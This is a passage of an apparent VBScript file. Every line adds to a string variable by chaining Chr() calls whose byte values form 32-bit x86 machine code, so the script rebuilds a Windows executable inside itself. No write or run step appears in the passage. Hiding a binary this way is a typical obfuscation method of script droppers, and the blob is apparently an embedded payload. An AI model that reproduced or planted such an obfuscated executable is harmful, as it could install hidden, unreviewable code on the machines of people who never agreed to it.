gfoN=gfoN&Chr(139)&Chr(77)&Chr(8)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(59)&Chr(203)&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(34)&Chr(247)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(171)&Chr(246)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(48)&Chr(139)&Chr(117)&Chr(16)&Chr(59)&Chr(243)&Chr(117)&Chr(4)&Chr(136)&Chr(25)&Chr(235)&Chr(218)&Chr(139)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(2)&Chr(66)&Chr(70)&Chr(58)&Chr(195)&Chr(116)&Chr(3)&Chr(79)&Chr(117)&Chr(243)&Chr(59)&Chr(251)&Chr(117)&Chr(16)&Chr(136)&Chr(25)&Chr(232)&Chr(231)&Chr(246)&Chr(255)&Chr(255)&Chr(106)&Chr(34)&Chr(89)&Chr(137)&Chr(8)&Chr(139)&Chr(241)&Chr(235)&Chr(193)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(139)
gfoN=gfoN&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(77)&Chr(8)&Chr(86)&Chr(51)&Chr(246)&Chr(59)&Chr(206)&Chr(124)&Chr(30)&Chr(131)&Chr(249)&Chr(2)&Chr(126)&Chr(12)&Chr(131)&Chr(249)&Chr(3)&Chr(117)&Chr(20)&Chr(161)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(235)&Chr(40)&Chr(161)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(137)&Chr(13)&Chr(104)&Chr(172)&Chr(64)&Chr(0)&Chr(235)&Chr(27)&Chr(232)&Chr(165)&Chr(246)&Chr(255)&Chr(255)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(45)&Chr(246)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(86)&Chr(139)&Chr(241)&Chr(198)&Chr(70)&Chr(12)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(99)&Chr(232)&Chr(75)&Chr(237)&Chr(255)&Chr(255)&Chr(137)&Chr(70)
gfoN=gfoN&Chr(8)&Chr(139)&Chr(72)&Chr(108)&Chr(137)&Chr(14)&Chr(139)&Chr(72)&Chr(104)&Chr(137)&Chr(78)&Chr(4)&Chr(139)&Chr(14)&Chr(59)&Chr(13)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(18)&Chr(139)&Chr(13)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(72)&Chr(112)&Chr(117)&Chr(7)&Chr(232)&Chr(22)&Chr(15)&Chr(0)&Chr(0)&Chr(137)&Chr(6)&Chr(139)&Chr(70)&Chr(4)&Chr(59)&Chr(5)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(116)&Chr(22)&Chr(139)&Chr(70)&Chr(8)&Chr(139)&Chr(13)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(72)&Chr(112)&Chr(117)&Chr(8)&Chr(232)&Chr(184)&Chr(2)&Chr(0)&Chr(0)&Chr(137)&Chr(70)&Chr(4)&Chr(139)&Chr(70)&Chr(8)&Chr(246)&Chr(64)&Chr(112)&Chr(2)&Chr(117)&Chr(20)&Chr(131)&Chr(72)&Chr(112)&Chr(2)&Chr(198)&Chr(70)&Chr(12)&Chr(1)&Chr(235)&Chr(10)&Chr(139)&Chr(8)&Chr(137)&Chr(14)&Chr(139)&Chr(64)&Chr(4)&Chr(137)
gfoN=gfoN&Chr(70)&Chr(4)&Chr(139)&Chr(198)&Chr(94)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(102)&Chr(255)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(69)&Chr(12)&Chr(139)&Chr(77)&Chr(244)&Chr(138)&Chr(85)&Chr(20)&Chr(132)&Chr(84)&Chr(1)&Chr(29)&Chr(117)&Chr(30)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(18)&Chr(139)&Chr(77)&Chr(240)&Chr(139)&Chr(137)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(65)&Chr(35)&Chr(69)&Chr(16)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(64)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(4)&Chr(106)
gfoN=gfoN&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(106)&Chr(0)&Chr(232)&Chr(154)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(93)&Chr(195)&Chr(45)&Chr(164)&Chr(3)&Chr(0)&Chr(0)&Chr(116)&Chr(34)&Chr(131)&Chr(232)&Chr(4)&Chr(116)&Chr(23)&Chr(131)&Chr(232)&Chr(13)&Chr(116)&Chr(12)&Chr(72)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(195)&Chr(184)&Chr(4)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(18)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(4)&Chr(8)&Chr(0)&Chr(0)&Chr(195)&Chr(184)&Chr(17)&Chr(4)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(139)&Chr(240)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(51)&Chr(255)&Chr(141)&Chr(70)&Chr(28)&Chr(87)&Chr(80)&Chr(232)&Chr(234)&Chr(27)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(15)&Chr(183)&Chr(200)&Chr(139)&Chr(193)&Chr(137)&Chr(126)&Chr(4)&Chr(137)&Chr(126)&Chr(8)&Chr(137)
gfoN=gfoN&Chr(126)&Chr(12)&Chr(193)&Chr(225)&Chr(16)&Chr(11)&Chr(193)&Chr(141)&Chr(126)&Chr(16)&Chr(171)&Chr(171)&Chr(171)&Chr(185)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(141)&Chr(70)&Chr(28)&Chr(43)&Chr(206)&Chr(191)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(138)&Chr(20)&Chr(1)&Chr(136)&Chr(16)&Chr(64)&Chr(79)&Chr(117)&Chr(247)&Chr(141)&Chr(134)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(138)&Chr(20)&Chr(8)&Chr(136)&Chr(16)&Chr(64)&Chr(78)&Chr(117)&Chr(247)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(28)&Chr(5)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(87)&Chr(141)&Chr(133)&Chr(232)&Chr(250)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(118)&Chr(4)&Chr(255)&Chr(21)&Chr(168)&Chr(128)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(191)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(251)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(136)&Chr(132)&Chr(5)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(64)&Chr(59)&Chr(199)&Chr(114)&Chr(244)&Chr(138)&Chr(133)&Chr(238)&Chr(250)&Chr(255)&Chr(255)&Chr(198)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(32)&Chr(132)&Chr(192)&Chr(116)&Chr(46)&Chr(141)&Chr(157)&Chr(239)&Chr(250)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(200)&Chr(15)&Chr(182)&Chr(3)&Chr(59)&Chr(200)&Chr(119)&Chr(22)&Chr(43)&Chr(193)&Chr(64)&Chr(80)&Chr(141)&Chr(148)&Chr(13)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(106)&Chr(32)&Chr(82)&Chr(232)&Chr(39)&Chr(27)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(67)&Chr(138)&Chr(3)&Chr(67)&Chr(132)&Chr(192)&Chr(117)&Chr(216)&Chr(106)&Chr(0)&Chr(255)&Chr(118)&Chr(12)&Chr(141)&Chr(133)&Chr(252)
gfoN=gfoN&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(4)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(238)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(232)&Chr(230)&Chr(33)&Chr(0)&Chr(0)&Chr(51)&Chr(219)&Chr(83)&Chr(255)&Chr(118)&Chr(4)&Chr(141)&Chr(133)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(87)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(87)&Chr(255)&Chr(118)&Chr(12)&Chr(83)&Chr(232)&Chr(199)&Chr(31)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(68)&Chr(83)&Chr(255)&Chr(118)&Chr(4)&Chr(141)&Chr(133)&Chr(252)&Chr(252)&Chr(255)&Chr(255)&Chr(87)&Chr(80)&Chr(87)&Chr(141)&Chr(133)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(80)&Chr(104)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(12)&Chr(83)&Chr(232)&Chr(162)&Chr(31)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(36)&Chr(51)&Chr(192)&Chr(15)&Chr(183)
gfoN=gfoN&Chr(140)&Chr(69)&Chr(252)&Chr(250)&Chr(255)&Chr(255)&Chr(246)&Chr(193)&Chr(1)&Chr(116)&Chr(14)&Chr(128)&Chr(76)&Chr(6)&Chr(29)&Chr(16)&Chr(138)&Chr(140)&Chr(5)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(235)&Chr(17)&Chr(246)&Chr(193)&Chr(2)&Chr(116)&Chr(21)&Chr(128)&Chr(76)&Chr(6)&Chr(29)&Chr(32)&Chr(138)&Chr(140)&Chr(5)&Chr(252)&Chr(252)&Chr(255)&Chr(255)&Chr(136)&Chr(140)&Chr(6)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(235)&Chr(8)&Chr(198)&Chr(132)&Chr(6)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(59)&Chr(199)&Chr(114)&Chr(190)&Chr(235)&Chr(86)&Chr(141)&Chr(134)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(199)&Chr(133)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(159)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(201)&Chr(41)&Chr(133)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(149)&Chr(228)&Chr(250)&Chr(255)&Chr(255)&Chr(141)&Chr(132)&Chr(14)&Chr(29)
gfoN=gfoN&Chr(1)&Chr(0)&Chr(0)&Chr(3)&Chr(208)&Chr(141)&Chr(90)&Chr(32)&Chr(131)&Chr(251)&Chr(25)&Chr(119)&Chr(12)&Chr(128)&Chr(76)&Chr(14)&Chr(29)&Chr(16)&Chr(138)&Chr(209)&Chr(128)&Chr(194)&Chr(32)&Chr(235)&Chr(15)&Chr(131)&Chr(250)&Chr(25)&Chr(119)&Chr(14)&Chr(128)&Chr(76)&Chr(14)&Chr(29)&Chr(32)&Chr(138)&Chr(209)&Chr(128)&Chr(234)&Chr(32)&Chr(136)&Chr(16)&Chr(235)&Chr(3)&Chr(198)&Chr(0)&Chr(0)&Chr(65)&Chr(59)&Chr(207)&Chr(114)&Chr(194)&Chr(139)&Chr(77)&Chr(252)&Chr(95)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(122)&Chr(23)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(72)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(70)&Chr(237)&Chr(255)&Chr(255)&Chr(232)&Chr(58)&Chr(234)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(161)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(133)&Chr(71)&Chr(112)&Chr(116)&Chr(29)&Chr(131)&Chr(127)&Chr(108)&Chr(0)&Chr(116)
gfoN=gfoN&Chr(23)&Chr(139)&Chr(119)&Chr(104)&Chr(133)&Chr(246)&Chr(117)&Chr(8)&Chr(106)&Chr(32)&Chr(232)&Chr(157)&Chr(217)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(232)&Chr(94)&Chr(237)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(13)&Chr(232)&Chr(97)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(119)&Chr(104)&Chr(137)&Chr(117)&Chr(228)&Chr(59)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(116)&Chr(54)&Chr(133)&Chr(246)&Chr(116)&Chr(26)&Chr(86)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(15)&Chr(129)&Chr(254)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(76)&Chr(4)&Chr(0)&Chr(0)&Chr(89)&Chr(161)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(71)&Chr(104)&Chr(139)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(86)&Chr(255)&Chr(21)
gfoN=gfoN&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(142)&Chr(139)&Chr(117)&Chr(228)&Chr(106)&Chr(13)&Chr(232)&Chr(38)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(83)&Chr(51)&Chr(219)&Chr(83)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(48)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(29)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(254)&Chr(254)&Chr(117)&Chr(30)&Chr(199)&Chr(5)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(176)&Chr(128)&Chr(64)&Chr(0)&Chr(56)&Chr(93)&Chr(252)&Chr(116)&Chr(69)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(235)&Chr(60)&Chr(131)&Chr(254)&Chr(253)&Chr(117)&Chr(18)&Chr(199)&Chr(5)&Chr(116)&Chr(178)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(172)&Chr(128)&Chr(64)&Chr(0)&Chr(235)&Chr(219)&Chr(131)&Chr(254)&Chr(252)&Chr(117)&Chr(18)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(64)&Chr(4)&Chr(199)&Chr(5)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(196)&Chr(56)&Chr(93)&Chr(252)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(139)&Chr(198)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(32)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(253)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(139)&Chr(93)&Chr(12)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(87)&Chr(232)&Chr(100)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(51)&Chr(246)&Chr(137)&Chr(125)&Chr(8)&Chr(59)&Chr(254)&Chr(117)&Chr(14)&Chr(139)&Chr(195)&Chr(232)
gfoN=gfoN&Chr(183)&Chr(252)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(233)&Chr(157)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(51)&Chr(192)&Chr(57)&Chr(184)&Chr(16)&Chr(168)&Chr(64)&Chr(0)&Chr(15)&Chr(132)&Chr(145)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(69)&Chr(228)&Chr(131)&Chr(192)&Chr(48)&Chr(61)&Chr(240)&Chr(0)&Chr(0)&Chr(0)&Chr(114)&Chr(231)&Chr(129)&Chr(255)&Chr(232)&Chr(253)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(112)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(255)&Chr(233)&Chr(253)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(100)&Chr(1)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(199)&Chr(80)&Chr(255)&Chr(21)&Chr(180)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(82)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(87)&Chr(255)&Chr(21)&Chr(168)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(51)&Chr(1)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(67)&Chr(28)&Chr(86)&Chr(80)&Chr(232)&Chr(71)&Chr(24)&Chr(0)&Chr(0)&Chr(51)&Chr(210)&Chr(66)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(123)&Chr(4)&Chr(137)&Chr(115)&Chr(12)&Chr(57)&Chr(85)&Chr(232)&Chr(15)&Chr(134)&Chr(248)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(125)&Chr(238)&Chr(0)&Chr(15)&Chr(132)&Chr(207)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(117)&Chr(239)&Chr(138)&Chr(14)&Chr(132)&Chr(201)&Chr(15)&Chr(132)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(182)&Chr(70)&Chr(255)&Chr(15)&Chr(182)&Chr(201)&Chr(233)&Chr(166)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(141)&Chr(67)&Chr(28)&Chr(86)&Chr(80)&Chr(232)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(228)&Chr(131)&Chr(196)&Chr(12)&Chr(107)&Chr(201)&Chr(48)&Chr(137)&Chr(117)&Chr(224)
gfoN=gfoN&Chr(141)&Chr(177)&Chr(32)&Chr(168)&Chr(64)&Chr(0)&Chr(137)&Chr(117)&Chr(228)&Chr(235)&Chr(42)&Chr(138)&Chr(70)&Chr(1)&Chr(132)&Chr(192)&Chr(116)&Chr(40)&Chr(15)&Chr(182)&Chr(62)&Chr(15)&Chr(182)&Chr(192)&Chr(235)&Chr(18)&Chr(139)&Chr(69)&Chr(224)&Chr(138)&Chr(128)&Chr(12)&Chr(168)&Chr(64)&Chr(0)&Chr(8)&Chr(68)&Chr(59)&Chr(29)&Chr(15)&Chr(182)&Chr(70)&Chr(1)&Chr(71)&Chr(59)&Chr(248)&Chr(118)&Chr(234)&Chr(139)&Chr(125)&Chr(8)&Chr(70)&Chr(70)&Chr(128)&Chr(62)&Chr(0)&Chr(117)&Chr(209)&Chr(139)&Chr(117)&Chr(228)&Chr(255)&Chr(69)&Chr(224)&Chr(131)&Chr(198)&Chr(8)&Chr(131)&Chr(125)&Chr(224)&Chr(4)&Chr(137)&Chr(117)&Chr(228)&Chr(114)&Chr(233)&Chr(139)&Chr(199)&Chr(137)&Chr(123)&Chr(4)&Chr(199)&Chr(67)&Chr(8)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(103)&Chr(251)&Chr(255)&Chr(255)&Chr(106)&Chr(6)&Chr(137)&Chr(67)&Chr(12)&Chr(141)&Chr(67)
gfoN=gfoN&Chr(16)&Chr(141)&Chr(137)&Chr(20)&Chr(168)&Chr(64)&Chr(0)&Chr(90)&Chr(102)&Chr(139)&Chr(49)&Chr(65)&Chr(102)&Chr(137)&Chr(48)&Chr(65)&Chr(64)&Chr(64)&Chr(74)&Chr(117)&Chr(243)&Chr(139)&Chr(243)&Chr(232)&Chr(215)&Chr(251)&Chr(255)&Chr(255)&Chr(233)&Chr(183)&Chr(254)&Chr(255)&Chr(255)&Chr(128)&Chr(76)&Chr(3)&Chr(29)&Chr(4)&Chr(64)&Chr(59)&Chr(193)&Chr(118)&Chr(246)&Chr(70)&Chr(70)&Chr(128)&Chr(126)&Chr(255)&Chr(0)&Chr(15)&Chr(133)&Chr(52)&Chr(255)&Chr(255)&Chr(255)&Chr(141)&Chr(67)&Chr(30)&Chr(185)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(8)&Chr(8)&Chr(64)&Chr(73)&Chr(117)&Chr(249)&Chr(139)&Chr(67)&Chr(4)&Chr(232)&Chr(18)&Chr(251)&Chr(255)&Chr(255)&Chr(137)&Chr(67)&Chr(12)&Chr(137)&Chr(83)&Chr(8)&Chr(235)&Chr(3)&Chr(137)&Chr(115)&Chr(8)&Chr(51)&Chr(192)&Chr(15)&Chr(183)&Chr(200)&Chr(139)&Chr(193)&Chr(193)&Chr(225)&Chr(16)&Chr(11)
gfoN=gfoN&Chr(193)&Chr(141)&Chr(123)&Chr(16)&Chr(171)&Chr(171)&Chr(171)&Chr(235)&Chr(168)&Chr(57)&Chr(53)&Chr(116)&Chr(178)&Chr(64)&Chr(0)&Chr(15)&Chr(133)&Chr(88)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(200)&Chr(255)&Chr(139)&Chr(77)&Chr(252)&Chr(95)&Chr(94)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(117)&Chr(20)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(106)&Chr(20)&Chr(104)&Chr(104)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(65)&Chr(234)&Chr(255)&Chr(255)&Chr(131)&Chr(77)&Chr(224)&Chr(255)&Chr(232)&Chr(49)&Chr(231)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(220)&Chr(232)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(139)&Chr(95)&Chr(104)&Chr(139)&Chr(117)&Chr(8)&Chr(232)&Chr(117)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(8)&Chr(59)&Chr(67)&Chr(4)&Chr(15)&Chr(132)&Chr(87)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(32)&Chr(2)&Chr(0)&Chr(0)&Chr(232)&Chr(6)
gfoN=gfoN&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(216)&Chr(133)&Chr(219)&Chr(15)&Chr(132)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(185)&Chr(136)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(119)&Chr(104)&Chr(139)&Chr(251)&Chr(243)&Chr(165)&Chr(131)&Chr(35)&Chr(0)&Chr(83)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(184)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(220)&Chr(255)&Chr(118)&Chr(104)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(17)&Chr(139)&Chr(70)&Chr(104)&Chr(61)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(40)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(94)&Chr(104)&Chr(83)&Chr(139)&Chr(61)&Chr(92)&Chr(128)&Chr(64)&Chr(0)&Chr(255)&Chr(215)&Chr(246)&Chr(70)&Chr(112)&Chr(2)
gfoN=gfoN&Chr(15)&Chr(133)&Chr(234)&Chr(0)&Chr(0)&Chr(0)&Chr(246)&Chr(5)&Chr(16)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(15)&Chr(133)&Chr(221)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(13)&Chr(232)&Chr(226)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(67)&Chr(4)&Chr(163)&Chr(132)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(8)&Chr(163)&Chr(136)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(12)&Chr(163)&Chr(140)&Chr(178)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(131)&Chr(248)&Chr(5)&Chr(125)&Chr(16)&Chr(102)&Chr(139)&Chr(76)&Chr(67)&Chr(16)&Chr(102)&Chr(137)&Chr(12)&Chr(69)&Chr(120)&Chr(178)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(232)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(61)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(125)&Chr(13)&Chr(138)&Chr(76)&Chr(24)&Chr(28)&Chr(136)&Chr(136)&Chr(0)
gfoN=gfoN&Chr(166)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(233)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(228)&Chr(61)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(125)&Chr(16)&Chr(138)&Chr(140)&Chr(24)&Chr(29)&Chr(1)&Chr(0)&Chr(0)&Chr(136)&Chr(136)&Chr(8)&Chr(167)&Chr(64)&Chr(0)&Chr(64)&Chr(235)&Chr(230)&Chr(255)&Chr(53)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(104)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(19)&Chr(161)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(61)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(111)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(29)&Chr(8)&Chr(168)&Chr(64)&Chr(0)&Chr(83)&Chr(255)&Chr(215)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(48)&Chr(106)&Chr(13)&Chr(232)&Chr(91)&Chr(236)&Chr(255)&Chr(255)&Chr(89)
